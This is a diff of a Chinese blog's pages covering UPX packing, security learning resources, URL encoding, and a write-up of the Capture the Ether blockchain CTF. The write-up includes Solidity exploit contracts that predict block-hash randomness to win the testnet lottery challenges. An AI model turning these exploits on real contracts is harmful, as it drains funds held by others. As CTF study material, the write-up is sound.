+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/" itemprop="url" rel="index"><span itemprop="name">区块链</span></a>
+                </span>
+            </span>
 
           
 
@@ -581,581 +404,350 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="UPX"><a href="#UPX" class="headerlink" title="UPX"></a>UPX</h1><p>UPX是一种加壳工具。</p>
-<p>它的工作流程首先将程序压缩。所谓的压缩包括两方面，一方面在程序的开头或者其他合适的地方 插入一段代码，另一方面是将程序的其他地方做压缩。</p>
-<p>压缩也可以叫做加密，因为压缩后的程序比较难看懂，主要是 和原来的代码有很大的不同。最大的表现也就是他的主要作用就是程序本身变小了。变小之后的程序在传输方面有很 大的优势。其次就是在程序执行时，实时的对程序解压缩。解压缩功能是在第一步时插入的代码完成的功能。</p>
-<p>联起来 就是：upx可以完成代码的压缩和实时解压执行。且不会影响程序的执行效率。 upx和普通的压缩，解压不同点就算在于upx是实时解压缩的。</p>
-<p>具体查看网址：<a target="_blank" rel="noopener" href="https://blog.csdn.net/zacklin/article/details/7419001">https://blog.csdn.net/zacklin/article/details/7419001</a></p>
-<h1 id="exeinfo"><a href="#exeinfo" class="headerlink" title="exeinfo"></a>exeinfo</h1><p>一种可以查看壳的工具</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://example.com/2022/03/17/resource/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Karry-Almond">
-      <meta itemprop="description" content="区块链">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Karry blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/03/17/resource/" class="post-title-link" itemprop="url">Untitled</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2022-03-17 21:25:43" itemprop="dateCreated datePublished" datetime="2022-03-17T21:25:43+08:00">2022-03-17</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-02-20 13:53:32" itemprop="dateModified" datetime="2022-02-20T13:53:32+08:00">2022-02-20</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h1><h2 id="各大src地址"><a href="#各大src地址" class="headerlink" title="各大src地址"></a>各大src地址</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Amdy_amdy/article/details/82801824">https://blog.csdn.net/Amdy_amdy/article/details/82801824</a></p>
-<h2 id="腾讯安全玄武实验室"><a href="#腾讯安全玄武实验室" class="headerlink" title="腾讯安全玄武实验室"></a>腾讯安全玄武实验室</h2><p><a target="_blank" rel="noopener" href="https://xlab.tencent.com/cn/">https://xlab.tencent.com/cn/</a></p>
-<h2 id="web安全圣经"><a href="#web安全圣经" class="headerlink" title="web安全圣经"></a>web安全圣经</h2><p>web之困</p>
-<h2 id="指导"><a href="#指导" class="headerlink" title="指导"></a>指导</h2><p>大部分走在网安路上的孩纸一般都会打打CTF比赛。从web方向来看，有很多奇淫技巧是在一般场景中遇不到的，但在脑洞大开、各种姿势的CTF比赛中会出现。（那个，，pwn选手不要打我）。认真的打每一场CTF比赛，记录下各种wp，我觉得是提高姿势的一个挺好的方法。另外就是，web方向的，还需要渗透&#x2F;实战，题主可以去各大SRC刷一刷，拿拿礼品，提提水平，赚赚小礼品&#x2F;大钱。除了渗透，web需要的比如代码审计功底，题主可以自己对各种漏洞进行分析，复现环境，写分析报告。一些cms应用网上可以自己下，一些比较麻烦的可以用p师傅的phith0n&#x2F;vulhub 以及 Medicean师傅的 Medicean&#x2F;VulApps 还有姿势的水平，光从比赛中打和学，可能会觉得知识点零散，或者并不深入。可以关注各大安全网站的文章，比如Sec-News 安全文摘，腾讯玄武实验室的每日安全动态推送，360的安全客，freebuf的文章，知道创宇的paper等等。当然这些文章可能分散多处，需要集齐才可召唤神龙&#x2F;flag，我。。我不要脸的 推荐一个repo：CHYbeta&#x2F;Web-Security-Learning  根据知识点稍稍做了分类，应该能帮到大家把。还有，安全嘛，攻与防是不断升级的，所以在这一块是要随时关注动态的。除了前面推荐的一些网站，你可以关注一些牛人的微博&#x2F;twitter&#x2F;知乎，比如微博里的tk教主，猪猪侠，还有经常撸猫的Ricter师傅等，twitter里的长短短师傅等，知乎里的某些大牛（不说了，有几位经常开车）。最后，我觉得这才是重点：Ricter 大佬说了玄武偏向于二进制漏洞</p>
-<h2 id="区块链ctf网址"><a href="#区块链ctf网址" class="headerlink" title="区块链ctf网址"></a>区块链ctf网址</h2><p><a target="_blank" rel="noopener" href="https://capturetheether.com/challenges/">https://capturetheether.com/challenges/</a></p>
-<p><a target="_blank" rel="noopener" href="https://blockchain-ctf.securityinnovation.com/">https://blockchain-ctf.securityinnovation.com/</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://example.com/2022/03/17/web/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Karry-Almond">
-      <meta itemprop="description" content="区块链">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Karry blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/03/17/web/" class="post-title-link" itemprop="url">Untitled</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2022-03-17 21:25:43" itemprop="dateCreated datePublished" datetime="2022-03-17T21:25:43+08:00">2022-03-17</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-03-15 14:25:09" itemprop="dateModified" datetime="2022-03-15T14:25:09+08:00">2022-03-15</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="URL中需要编码的字符"><a href="#URL中需要编码的字符" class="headerlink" title="URL中需要编码的字符"></a>URL中需要编码的字符</h1><p>简单总结：</p>
-<blockquote>
-<p>ASCII 表中没有对应的可显示字符，例如，汉字。 不安全字符，包括：# ”% &lt;&gt; [] {} | \ ^ &#96; 。 部分保留字符，即 &amp; &#x2F; : ; &#x3D; ? @ 。</p>
-</blockquote>
-<p>具体查看网址：[URL编码&#x2F;解码详解_ccc369639963的博客-CSDN博客](<a target="_blank" rel="noopener" href="https://blog.csdn.net/ccc369639963/article/details/123398268#:~:text=URL">https://blog.csdn.net/ccc369639963/article/details/123398268#:~:text=URL</a> 之所以需要编码，是因为 URL 中的某些字符会引起歧义，比如 URL 查询参数中包含了”%26”或者”%”就会造成服务器解析错误；再比如，URL 的编码格式采用的是 ASCII,Unicode 格式，这表明 URL 中不允许包含任何非 ASCII 字符（比如中文），否则就会造成 URL 解析错误。)</p>
-<p>可使用的编码解码网站：<a target="_blank" rel="noopener" href="https://tool.ip138.com/urlencode/">URL解码 URL编码 在线URL解码&#x2F;编码工具 (ip138.com)</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://example.com/2022/03/17/blockchain-ctf/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Karry-Almond">
-      <meta itemprop="description" content="区块链">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Karry blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/03/17/blockchain-ctf/" class="post-title-link" itemprop="url">Untitled</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2022-03-17 21:25:43" itemprop="dateCreated datePublished" datetime="2022-03-17T21:25:43+08:00">2022-03-17</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-03-06 13:26:01" itemprop="dateModified" datetime="2022-03-06T13:26:01+08:00">2022-03-06</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="区块链官方CTF题-write-up"><a href="#区块链官方CTF题-write-up" class="headerlink" title="区块链官方CTF题 write-up"></a>区块链官方CTF题 write-up</h1><p>官方网站：<a target="_blank" rel="noopener" href="https://capturetheether.com/challenges/">https://capturetheether.com/challenges/</a></p>
-<p>做题基本步骤：先下载好metamask插件并装载在浏览器上。登录metamask后点击题目左边的 <code>Begin Challenge</code> ，metamask会弹出是否发送消息的对话框，点击确定，之后会自动在Ropsten测试网上加载好ctf环境，之后就可以开始做题。完成题目后点击 <code>Check Solution</code> ，同样metamask会弹出是否发送消息的对话框，点击确定，完成验证。</p>
-<h2 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h2><h3 id="Deploy-a-contract"><a href="#Deploy-a-contract" class="headerlink" title="Deploy a contract"></a><a target="_blank" rel="noopener" href="https://capturetheether.com/challenges/warmup/deploy/">Deploy a contract</a></h3><ul>
-<li>Write-Up</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">直接点击 Begin Challenge , metamask 会弹出是否发送消息的对话框，点击确定。</span><br><span class="line">Begin Challenge 的圈圈转好之后，点击 Check Solution ，同样metamask会弹出是否发送消息的对话框，点击确定。</span><br></pre></td></tr></table></figure>
-
-<h3 id="Call-me"><a href="#Call-me" class="headerlink" title="Call me"></a><a target="_blank" rel="noopener" href="https://capturetheether.com/challenges/warmup/call-me/">Call me</a></h3><ul>
-<li><p>Write-Up</p>
-<p>总结：要想调用一个已经在链上部署的合约的函数，一个比较简单的方法是把源代码复制在remix上，再在deploy中的at address 框中输入已部署的合约地址。必须要这样，remix才可以找到已部署的合约并使用。</p>
-</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">打开 remix.ethereum.org 这个网址，新建一个合约文件，把solidity代码源码复制粘贴在合约文件中。</span><br><span class="line">在网址左侧找到 compile 栏，并单击右侧的compile按钮，编译该文件。</span><br><span class="line">在网址左侧找到 deploy 栏，environment下拉菜单中选择Injected Web3。</span><br><span class="line">在 deploy 栏中找到 at address ，在右侧框内输入题目中给的合约地址，点击 at address，下方会显示合约和合约函数列表，点击 callme 函数。</span><br><span class="line">完成</span><br></pre></td></tr></table></figure>
-
-<h3 id="Choose-a-nickname"><a href="#Choose-a-nickname" class="headerlink" title="Choose a nickname"></a><a target="_blank" rel="noopener" href="https://capturetheether.com/challenges/warmup/nickname/">Choose a nickname</a></h3><h2 id="Lotteries"><a href="#Lotteries" class="headerlink" title="Lotteries"></a>Lotteries</h2><h3 id="Guess-the-number"><a href="#Guess-the-number" class="headerlink" title="Guess the number"></a><a target="_blank" rel="noopener" href="https://capturetheether.com/challenges/lotteries/guess-the-number/">Guess the number</a></h3><h3 id="Guess-the-secret-number"><a href="#Guess-the-secret-number" class="headerlink" title="Guess the secret number"></a><a target="_blank" rel="noopener" href="https://capturetheether.com/challenges/lotteries/guess-the-secret-number/">Guess the secret number</a></h3><h3 id="Guess-the-random-number"><a href="#Guess-the-random-number" class="headerlink" title="Guess the random number"></a><a target="_blank" rel="noopener" href="https://capturetheether.com/challenges/lotteries/guess-the-random-number/">Guess the random number</a></h3><ul>
-<li><p>题目：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract GuessTheRandomNumberChallenge &#123;</span><br><span class="line">    uint8 answer;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">GuessTheRandomNumberChallenge</span><span class="params">()</span> public payable &#123;</span><br><span class="line">        require(msg.value == <span class="number">1</span> ether);</span><br><span class="line">        answer = uint8(keccak256(block.blockhash(block.number - <span class="number">1</span>), now));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">isComplete</span><span class="params">()</span> public view <span class="title function_">returns</span> <span class="params">(<span class="type">bool</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> address(this).balance == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">guess</span><span class="params">(uint8 n)</span> public payable &#123;</span><br><span class="line">        require(msg.value == <span class="number">1</span> ether);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (n == answer) &#123;</span><br><span class="line">            msg.sender.transfer(<span class="number">2</span> ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-<li><p>Write-up</p>
-<p>虽然uint8只有255种可能，但是<code>isComplete()</code>要求<code>address(this).balance == 0</code>。那么一次环境只能<code>guess</code>一次。所以我们要在<code>guess</code>前，先计算出来answer的值。</p>
-<blockquote>
-<p>answer &#x3D; uint8(keccak256(block.blockhash(block.number - 1), now));</p>
-</blockquote>
-<blockquote>
-<p><code>block.number</code> 即本区块的区块号</p>
-<p><code>block.blockhash</code> 即目标区块号的区块哈希（<code>block.blockhash</code> 在 0.4.22 开始不推荐使用，在 0.5.0 已经移除了）</p>
-<p><code>now</code> 即本区块号的时间戳，其值等于block.timestamp（在 0.7.0, <code>now</code> 被移除了）</p>
-</blockquote>
-<p>在<code>etherscan.io</code>上搜索合约，以<code>0xe2d8265D24A4e1045008AEAD2175C46dFA55b834</code>这个合约地址为例。</p>
-<p><img src="https://github.com/Karry-Almond/blog.io/raw/gh-pages/pic/blockchain-ctf-guessrandom1.png"></p>
-<p><img src="https://github.com/Karry-Almond/blog.io/raw/gh-pages/pic/blockchain-ctf-guessrandom2.png"></p>
-<p>一号是block号，点击进去后可以查看blockhash，也可以切换到别的block号进行查看。得到</p>
-<blockquote>
-<p>block.blockhash(block.number - 1) &#x3D; 0xbf411fd6aafdb859366aa052324f4580e735387e4b49cf8d4828433c6b3eeed0</p>
-</blockquote>
-<p>二号是timestamp。也就是构造体中的<code>now</code>。得到<code>Feb-20-2022 07:28:53 AM +UTC</code>。我们通过随便一个时间戳转换网址，把<code>UTC时间转换成UNIX时间戳</code>，得到时间戳<code>1645342133</code>。</p>
-<p>接着构造一个合约用于计算<code>keccak256</code>，合约如下。执行合约得解。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract GuessTheRandomNumberChallenge &#123;</span><br><span class="line">    uint8 public answer;</span><br><span class="line"></span><br><span class="line">    function guess() public payable returns(uint8)&#123;</span><br><span class="line">		answer = uint8(keccak256(bytes32(0xbf411fd6aafdb859366aa052324f4580e735387e4b49cf8d4828433c6b3eeed0), uint(1645342133)));</span><br><span class="line">		</span><br><span class="line">		return answer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>注意：要把<code>0xbf411fd6aafdb859366aa052324f4580e735387e4b49cf8d4828433c6b3eeed0</code>转换成<code>bytes32</code>，把<code>1645342133</code>转换成<code>uint</code>格式。</p>
-<p>因为<code>block.blockhash</code>返回值是<code>bytes32</code>，<code>now</code>返回值是<code>uint</code></p>
-</blockquote>
-</li>
-</ul>
-<h3 id="Guess-the-new-number"><a href="#Guess-the-new-number" class="headerlink" title="Guess the new number"></a><a target="_blank" rel="noopener" href="https://capturetheether.com/challenges/lotteries/guess-the-new-number/">Guess the new number</a></h3><ul>
-<li><p>题目</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract GuessTheNewNumberChallenge &#123;</span><br><span class="line">    function GuessTheNewNumberChallenge() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint8 n) public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));</span><br><span class="line"></span><br><span class="line">        if (n == answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>Write-Up</p>
-<p>该题目的keccak256计算是跟随函数一起执行的，所以无法使用“提前算出answer，手动执行函数”的思路。但是只需要answer的计算和guess中处于同一个区块即可。</p>
-<blockquote>
-<p>思路：创建另外一个合约函数，在新函数内部计算<code>uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now))</code>，再调用<code>guess(uint8 n)</code>，<code>answer</code>作为<code>guess(uint8 n)</code>的参数。</p>
-<p>即可实现answer的计算和guess(uint8 n)在同一个区块。</p>
-</blockquote>
-<p>攻击合约如下：</p>
-</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract GuessTheNewNumberChallenge &#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract exploit&#123;</span><br><span class="line"></span><br><span class="line">    function deposit() payable returns (uint)&#123;</span><br><span class="line">        return msg.value;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function withdraw() payable &#123;</span><br><span class="line">        msg.sender.transfer(this.balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attacker(address addr) &#123;</span><br><span class="line">        require(this.balance &gt;= 1 ether);</span><br><span class="line"></span><br><span class="line">        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));</span><br><span class="line"></span><br><span class="line">        GuessTheNewNumberChallenge guessContract = GuessTheNewNumberChallenge(addr);</span><br><span class="line">        guessContract.guess.value(1 ether)(answer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function () payable&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>做的时候思路一开始就正确了，但是实现的时候总是报<code>transaction revert error</code>。</p>
-<p><strong>这里有几个点需要特别注意理解：</strong></p>
-<ol>
-<li><p><code>guessContract.guess.value(1 ether)(answer);</code></p>
-<p>.value()是写在函数名和括号之间的。</p>
-</li>
-<li><p><code>function () payable&#123;&#125;</code></p>
-<p><strong>非常重要！！！</strong></p>
-<p>就是因为没有写支持<code>payable</code>的<code>fallback</code>函数导致一直报</p>
-<blockquote>
-<p><code>Gas estimation failed:execution reverted</code>。</p>
-</blockquote>
-<p>原因是<code>guess(uint8)</code>函数中有一条<code>msg.sender.transfer(2 ether);</code>会产生带有以太的回调。如果回调函数（即fallback函数）没有<code>payable</code>关键字，那就会报错。</p>
-<p><img src="https://github.com/Karry-Almond/blog.io/raw/gh-pages/pic/blockchain-ctf-guessNew.png"></p>
-</li>
-<li><p><code>function attacker(address addr) &#123;&#125;</code></p>
-<p>这个函数没有使用<code>payable</code>关键字，但是内部却使用了.value()。换言之，<code>payable</code>关键字的含义是“<strong>调用该函数时</strong>是否可以携带以太”。</p>
-<p>该函数调用别的函数时，只要别的函数有<code>payable</code>关键字就可以。</p>
-</li>
-</ol>
-</li>
-</ul>
-<h3 id="Predict-the-future"><a href="#Predict-the-future" class="headerlink" title="Predict the future"></a><a target="_blank" rel="noopener" href="https://capturetheether.com/challenges/lotteries/predict-the-future/">Predict the future</a></h3><ul>
-<li>题目</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract PredictTheFutureChallenge &#123;</span><br><span class="line">    address guesser;</span><br><span class="line">    uint8 guess;</span><br><span class="line">    uint256 settlementBlockNumber;</span><br><span class="line"></span><br><span class="line">    function PredictTheFutureChallenge() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function lockInGuess(uint8 n) public payable &#123;</span><br><span class="line">        require(guesser == 0);</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line"></span><br><span class="line">        guesser = msg.sender;</span><br><span class="line">        guess = n;</span><br><span class="line">        settlementBlockNumber = block.number + 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function settle() public &#123;</span><br><span class="line">        require(msg.sender == guesser);</span><br><span class="line">        require(block.number &gt; settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;</span><br><span class="line"></span><br><span class="line">        guesser = 0;</span><br><span class="line">        if (guess == answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>Write-Up</p>
-<p>题目含义是answer的设置必须在<code>keccak256</code>的区块之前就进行。</p>
-<p>一开始的思路是能否确定<code>settle()</code>函数在哪个区块被执行，然后根据这个answer先计算。发现根本不可能确定具体在哪个区块被执行，遂放弃这个思路。</p>
-<p>重点是在于answer模了10，那么这个answer的可取值范围就很小了。开始考虑爆破。</p>
-<p>题目最后验证的是合约没有以太。如果我们执行了一次<code>settle()</code>又失败了，那么由于 <code>guesser= 0;</code>，guesser被重置，又要执行一次<code>lockInGuess(uint8 n)</code>，就又增加了1 ether。那么最后即使answer猜中了，验证也不会通过。所以我们必须执行仅仅一次<code>settle()</code>就成功。实现一个合约，在调用<code>settle()</code>前先判断一下answer是否猜中即可。</p>
-<p>攻击合约的代码如下：</p>
-</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract PredictTheFutureChallenge &#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract exploit&#123;</span><br><span class="line">    uint8 guess;</span><br><span class="line">    address addr_predContract;</span><br><span class="line"></span><br><span class="line">    function callLockInGuess(uint8 n,address addr) payable &#123;</span><br><span class="line">        guess = n;</span><br><span class="line">        addr_predContract = addr;</span><br><span class="line">        PredictTheFutureChallenge predContract = PredictTheFutureChallenge(addr_predContract);</span><br><span class="line">        predContract.lockInGuess.value(1 ether)(guess);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attacker()&#123;</span><br><span class="line">        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;</span><br><span class="line"></span><br><span class="line">        require(answer == guess);</span><br><span class="line"></span><br><span class="line">        PredictTheFutureChallenge predContract = PredictTheFutureChallenge(addr_predContract);</span><br><span class="line">        predContract.settle();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() payable&#123;</span><br><span class="line">        msg.sender.transfer(this.balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function () payable &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>执行流程：</p>
-<ol>
-<li><p>首先执行 <code>callLockInGuess(uint8 n,address addr)</code></p>
-<p>n随便填一个0-9的数，addr是挑战的地址。</p>
-</li>
-<li><p>多点几次<code>attacker()</code>，不管警告。多半会返回transaction fail，直到transaction success为止。当然也可以写个脚本发送请求，但是由于爆破的范围很小，手动点几下基本都可以碰撞成功。</p>
-</li>
-</ol>
-<p>注意：在remix上执行的时候，一般情况都会出现<code>revert error</code></p>
-<blockquote>
-<p><code>Gas estimation failed:execution reverted</code>。</p>
-</blockquote>
-<p>也可能没有错误提示，直接可以执行。</p>
